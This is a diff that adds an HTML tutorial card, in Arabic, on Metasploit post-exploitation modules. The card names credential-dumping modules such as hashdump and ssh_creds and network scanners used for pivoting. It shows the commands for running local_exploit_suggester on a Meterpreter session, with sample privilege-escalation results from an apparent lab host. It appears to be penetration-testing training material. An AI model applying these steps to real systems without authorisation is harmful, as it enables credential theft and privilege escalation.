@@ -490,6 +490,48 @@ msf6 post(local_exploit_suggester) > <span class="cmd">set SESSION 1</span></div
   </div>
 
   <div class="card">
+    <div class="card-title">🏴 Post-Exploitation Modules — 3 أنواع</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
+      بعد ما تخترق جهاز وترسل الجلسة للخلفية، تشغّل عليها Post modules لتعميق الاختراق.
+    </p>
+    <table>
+      <tr><th>النوع</th><th>الوظيفة</th><th>مثال</th></tr>
+      <tr>
+        <td class="mono danger">Credential Gatherers</td>
+        <td>سرقة usernames وpasswords وhashes</td>
+        <td class="mono">post/windows/gather/hashdump<br>post/multi/gather/ssh_creds</td>
+      </tr>
+      <tr>
+        <td class="mono warn">Local Exploit Suggesters</td>
+        <td>يقترح ثغرات لرفع الصلاحيات (PrivEsc)</td>
+        <td class="mono">post/multi/recon/local_exploit_suggester</td>
+      </tr>
+      <tr>
+        <td class="mono safe">Internal Network Scanners</td>
+        <td>يفحص الشبكة الداخلية لإيجاد أجهزة ثانية (Pivoting)</td>
+        <td class="mono">post/multi/gather/ping_sweep<br>auxiliary/scanner/portscan/tcp</td>
+      </tr>
+    </table>
+
+    <div class="lbl">كيف تستخدمهم مع Sessions:</div>
+    <div class="code"><span class="cmt"># 1. أرسل الجلسة للخلفية:</span>
+meterpreter > <span class="cmd">background</span>
+
+<span class="cmt"># 2. شغّل الـ Post module:</span>
+msf6 > <span class="cmd">use post/multi/recon/local_exploit_suggester</span>
+
+<span class="cmt"># 3. اربطه بالجلسة:</span>
+msf6 post > <span class="cmd">show options</span>    <span class="cmt"># شوف خانة SESSION</span>
+msf6 post > <span class="cmd">set SESSION 1</span>
+msf6 post > <span class="cmd">run</span>
+
+<span class="cmt"># النتيجة:</span>
+<span class="ok">[+] 10.10.10.205 - Exploit: exploit/windows/local/ms16_032_secondary_logon_handle_privesc</span>
+<span class="ok">[+] 10.10.10.205 - Exploit: exploit/windows/local/ms10_092_schelevator</span></div>
+    <div class="alert success">🎯 local_exploit_suggester يكتشف ثغرات PrivEsc تلقائياً — بعدها تستخدم الثغرة لترفع صلاحياتك!</div>
+  </div>
+
+  <div class="card">
     <div class="card-title">⚙️ Jobs — المهام الخلفية</div>
     <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
       Jobs = مهام تشتغل في الخلفية بشكل مستقل. مفيدة للـ listeners اللي لازم تفضل شغالة.
